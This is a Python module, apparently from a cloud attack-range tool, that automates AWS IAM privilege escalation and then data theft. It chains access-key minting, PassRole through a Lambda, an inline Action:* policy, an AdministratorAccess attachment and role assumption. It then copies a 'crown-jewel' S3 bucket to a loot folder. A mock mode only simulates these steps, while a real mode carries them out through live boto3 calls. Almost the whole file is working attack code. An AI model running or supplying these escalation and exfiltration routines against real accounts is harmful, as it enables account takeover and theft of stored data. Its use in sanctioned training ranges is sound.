"""attack.py -- execute a privilege-escalation path, then exfil the crown jewels.

Given a start principal, find its shortest path to ADMIN (via :mod:`privesc`),
then walk the path step by step:

  * **mock mode** -- *simulate* each step and log exactly what an attacker would
    run (the boto3 call + the technique). Nothing touches AWS or the network.
  * **real mode** -- perform the real boto3 calls against a deployed range. Each
    method is implemented; this is genuine code, gated behind ``--mock=False``.

After reaching admin, the chain reads the crown-jewel S3 bucket (data exfil) and
logs every object retrieved. Every step records its technique name so the run is
self-explaining.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from .model import AccountModel
from .privesc import PrivescPath, find_privesc_path


@dataclass
class AttackStep:
    seq: int
    technique: str
    action: str
    description: str
    command: str  # the concrete call an operator/automation would run
    result: str
    success: bool = True


@dataclass
class AttackResult:
    start: str
    path: PrivescPath | None
    steps: list[AttackStep] = field(default_factory=list)
    reached_admin: bool = False
    exfiltrated: list[str] = field(default_factory=list)
    crown_jewel_bucket: str | None = None

    @property
    def succeeded(self) -> bool:
        return self.reached_admin and bool(self.exfiltrated)


class AttackChain:
    """Runs an attack path. Use ``mock=True`` for the offline simulation."""

    def __init__(self, model: AccountModel, mock: bool = True, region: str = "us-east-1"):
        self.model = model
        self.mock = mock
        self.region = region
        self._seq = 0

    # ------------------------------------------------------------------ #
    def run(self, start: str) -> AttackResult:
        path = find_privesc_path(self.model, start)
        result = AttackResult(start=start, path=path)

        if path is None:
            result.steps.append(
                AttackStep(
                    seq=self._next(),
                    technique="enumerate",
                    action="privesc-search",
                    description=f"No privilege-escalation path found from '{start}'.",
                    command=f"cloudrange privesc --principal {start}",
                    result="NO PATH -- principal is genuinely low-privilege.",
                    success=False,
                )
            )
            return result

        # Walk each escalation edge.
        for edge in path.edges:
            step = self._execute_edge(edge)
            result.steps.append(step)

        result.reached_admin = path.reaches_admin

        # Exfil the crown jewels using the now-admin access.
        if result.reached_admin:
            self._exfiltrate(result)

        return result

    # ------------------------------------------------------------------ #
    def _execute_edge(self, edge) -> AttackStep:
        handler = {
            "CreateAccessKey": self._do_create_access_key,
            "PassRole+Lambda": self._do_passrole_lambda,
            "PutUserPolicy": self._do_put_user_policy,
            "AttachUserPolicy": self._do_attach_user_policy,
            "AssumeRole": self._do_assume_role,
        }.get(edge.technique)
        if handler is None:  # pragma: no cover - catalog is exhaustive
            return AttackStep(
                seq=self._next(),
                technique=edge.technique,
                action="unknown",
                description=edge.detail,
                command="<no handler>",
                result="SKIPPED",
                success=False,
            )
        return handler(edge)

    # --- per-technique handlers --------------------------------------- #
    def _do_create_access_key(self, edge) -> AttackStep:
        target = edge.target_resource or (
            edge.dst if edge.dst != "ADMIN" else self._admin_user_name())
        cmd = f"aws iam create-access-key --user-name {target}"
        if self.mock:
            res = (
                f"[SIMULATED] Minted access key AKIA<redacted> for '{target}'. "
                f"Now authenticated as '{target}'."
            )
        else:  # pragma: no cover - needs live creds
            import boto3

            iam = boto3.client("iam", region_name=self.region)
            key = iam.create_access_key(UserName=target)["AccessKey"]
            res = f"Created access key {key['AccessKeyId']} for {target}."
        return AttackStep(
            self._next(), edge.technique, "iam:CreateAccessKey",
            edge.detail, cmd, res,
        )

    def _do_passrole_lambda(self, edge) -> AttackStep:
        role = edge.target_resource or (
            edge.dst if edge.dst != "ADMIN" else self._lambda_admin_role_name())
        cmd = (
            f"aws lambda create-function --function-name cr-pwn "
            f"--role arn:aws:iam::{self.model.account_id}:role/{role} "
            f"--runtime python3.11 --handler h.run --zip-file fileb://pwn.zip && "
            f"aws lambda invoke --function-name cr-pwn out.json"
        )
        if self.mock:
            res = (
                f"[SIMULATED] Created Lambda 'cr-pwn' with execution role "
                f"'{role}' (PassRole), invoked it -> code now runs with that "
                f"role's admin permissions."
            )
        else:  # pragma: no cover
            res = self._real_passrole_lambda(role)
        return AttackStep(
            self._next(), edge.technique, "iam:PassRole + lambda:CreateFunction",
            edge.detail, cmd, res,
        )

    def _do_put_user_policy(self, edge) -> AttackStep:
        victim = edge.target_resource or edge.src
        cmd = (
            f"aws iam put-user-policy --user-name {victim} "
            f"--policy-name cr-admin "
            f'--policy-document \'{{"Version":"2012-10-17","Statement":'
            f'[{{"Effect":"Allow","Action":"*","Resource":"*"}}]}}\''
        )
        if self.mock:
            res = (
                f"[SIMULATED] Wrote inline policy 'cr-admin' (Action:* / "
                f"Resource:*) onto '{victim}' -> now effectively admin."
            )
        else:  # pragma: no cover
            import boto3, json

            iam = boto3.client("iam", region_name=self.region)
            iam.put_user_policy(
                UserName=victim,
                PolicyName="cr-admin",
                PolicyDocument=json.dumps(
                    {"Version": "2012-10-17", "Statement": [
                        {"Effect": "Allow", "Action": "*", "Resource": "*"}]}
                ),
            )
            res = "Inline admin policy written."
        return AttackStep(
            self._next(), edge.technique, "iam:PutUserPolicy",
            edge.detail, cmd, res,
        )

    def _do_attach_user_policy(self, edge) -> AttackStep:
        victim = edge.target_resource or edge.src
        cmd = (
            f"aws iam attach-user-policy --user-name {victim} "
            f"--policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        )
        if self.mock:
            res = (
                f"[SIMULATED] Attached AdministratorAccess to '{victim}' "
                f"-> now admin."
            )
        else:  # pragma: no cover
            import boto3

            iam = boto3.client("iam", region_name=self.region)
            iam.attach_user_policy(
                UserName=victim,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
            )
            res = "AdministratorAccess attached."
        return AttackStep(
            self._next(), edge.technique, "iam:AttachUserPolicy",
            edge.detail, cmd, res,
        )

    def _do_assume_role(self, edge) -> AttackStep:
        role = edge.target_resource or (
            edge.dst if edge.dst != "ADMIN" else self._first_admin_role())
        cmd = (
            f"aws sts assume-role "
            f"--role-arn arn:aws:iam::{self.model.account_id}:role/{role} "
            f"--role-session-name cr"
        )
        if self.mock:
            res = (
                f"[SIMULATED] Assumed role '{role}', obtained temporary "
                f"session credentials and that role's permissions."
            )
        else:  # pragma: no cover
            import boto3

            sts = boto3.client("sts", region_name=self.region)
            sts.assume_role(
                RoleArn=f"arn:aws:iam::{self.model.account_id}:role/{role}",
                RoleSessionName="cr",
            )
            res = f"Assumed {role}."
        return AttackStep(
            self._next(), edge.technique, "sts:AssumeRole",
            edge.detail, cmd, res,
        )

    # ------------------------------------------------------------------ #
    def _exfiltrate(self, result: AttackResult) -> None:
        jewels = self.model.crown_jewel_buckets()
        if not jewels:
            return
        bucket = jewels[0]
        result.crown_jewel_bucket = bucket.name
        cmd = f"aws s3 sync s3://{bucket.name}/ ./loot/"
        if self.mock:
            objs = list(bucket.objects)
            res = f"[SIMULATED] Downloaded {len(objs)} object(s): {', '.join(objs)}"
        else:  # pragma: no cover
            import boto3

            s3 = boto3.client("s3", region_name=self.region)
            objs = [
                o["Key"]
                for o in s3.list_objects_v2(Bucket=bucket.name).get("Contents", [])
            ]
            for key in objs:
                s3.get_object(Bucket=bucket.name, Key=key)
            res = f"Downloaded {len(objs)} object(s)."
        result.exfiltrated = objs
        result.steps.append(
            AttackStep(
                self._next(), "S3Exfil", "s3:GetObject",
                f"Read crown-jewel data from bucket '{bucket.name}' using "
                f"the freshly-obtained admin access.",
                cmd, res,
            )
        )

    # --- small helpers ------------------------------------------------- #
    def _next(self) -> int:
        self._seq += 1
        return self._seq

    def _self_user(self, name: str) -> str:
        return name

    def _admin_user_name(self) -> str:
        for u in self.model.users.values():
            from .model import principal_is_admin

            if principal_is_admin(u):
                return u.name
        return "admin"

    def _lambda_admin_role_name(self) -> str:
        from .model import principal_is_admin
        from .privesc import _role_trusts_service

        for r in self.model.roles.values():
            if principal_is_admin(r) and _role_trusts_service(r, "lambda.amazonaws.com"):
                return r.name
        return "lambda-admin-role"

    def _first_admin_role(self) -> str:
        from .model import principal_is_admin

        for r in self.model.roles.values():
            if principal_is_admin(r):
                return r.name
        return "admin-role"

    def _real_passrole_lambda(self, role: str) -> str:  # pragma: no cover
        import io
        import json
        import zipfile

        import boto3

        lam = boto3.client("lambda", region_name=self.region)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr(
                "h.py",
                "import boto3\n"
                "def run(e,c):\n"
                "    return boto3.client('sts').get_caller_identity()\n",
            )
        lam.create_function(
            FunctionName="cr-pwn",
            Runtime="python3.11",
            Role=f"arn:aws:iam::{self.model.account_id}:role/{role}",
            Handler="h.run",
            Code={"ZipFile": buf.getvalue()},
        )
        resp = lam.invoke(FunctionName="cr-pwn")
        return f"Invoked cr-pwn as {role}: {resp['StatusCode']}"


def run_attack(
    model: AccountModel, start: str, mock: bool = True, region: str = "us-east-1"
) -> AttackResult:
    return AttackChain(model, mock=mock, region=region).run(start)
